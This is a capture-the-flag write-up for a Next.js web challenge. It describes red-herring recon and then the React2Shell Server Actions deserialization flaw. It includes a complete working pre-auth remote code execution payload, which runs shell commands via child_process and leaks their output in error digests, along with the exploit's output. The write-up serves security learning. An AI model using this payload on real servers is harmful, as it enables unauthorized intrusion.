# Old website — BushBash2026 (web, medium)

**Flag:** `bushbash{youWillNeverCatchMe!IDugATunnelOut}`

**Target:** http://34.40.133.67:8080 · **Vuln:** CVE-2025-55182 ("React2Shell") · Next.js **15.0.4** App Router pre-auth RCE.

## Recon
- `X-Powered-By: Next.js`, RSC `Vary` headers, homepage: *"Zoowee Blubberworth's epic website — No content loaded - database offline"*.
- `package.json` (read post-RCE) literally: `"description": "react2shell chal"`, `next: 15.0.4`, react 19.

## The trap (red herrings)
The narrative ("old domain names", "database offline", "hasn't been updated in a year") pushes you toward:
- hidden-route hunting via the Next.js `__routerFilterStatic` bloom filter → **only `/` and `/_not-found`** (brute of 2.1M short strings + directory-list-220k + rockyou-14M via a reconstructed MurmurHash2 filter found **no** content route),
- cache poisoning (CVE-2024-46982 — pages-router only), middleware bypass (CVE-2025-29927), RSC/prefetch stale content, host-header / "old domain" routing.

**All dead ends.** `page.jsx` just statically renders the "database offline" string — there is no DB, no route, no host routing.

## The vuln — React Flight / Server Actions RCE
Next.js Server Actions deserialize a React **Flight** payload. A crafted chunk pivots
`then → $1:__proto__:then` and `get → $1:constructor:constructor` (the **Function constructor**),
executing attacker JS server-side. Trigger with a multipart `POST /` carrying header `Next-Action: x`.

Output is exfiltrated by throwing an `Error` whose **`digest`** is the command output — it comes
back in the RSC 500 body as `1:E{"digest":"<stdout>"}`.

```
POST /  Next-Action: x   (multipart/form-data)
 field "0" = {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,
              "value":"{\"then\":\"$B1337\"}",
              "_response":{"_prefix":"var res=require('child_process').execSync('id').toString();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`${res}`});",
                           "_formData":{"get":"$1:constructor:constructor"}}}
 field "1" = "$@0"
```

## Getting the flag
```
$ python3 exploit.py "id"
uid=1000(node) gid=1000(node) groups=1000(node)
$ python3 exploit.py 'ls /app'         # .next app node_modules package.json zoowee_message.txt
$ python3 exploit.py 'cat /app/zoowee_message.txt'
bushbash{youWillNeverCatchMe!IDugATunnelOut}
```

## Lesson
On **any Next.js App Router** target (Next-Router `Vary` + `X-Powered-By: Next.js`), try the
**Server Actions / React2Shell RCE first** (Next-Action header + Flight proto-pollution) before
sinking hours into route/cache/host recon.
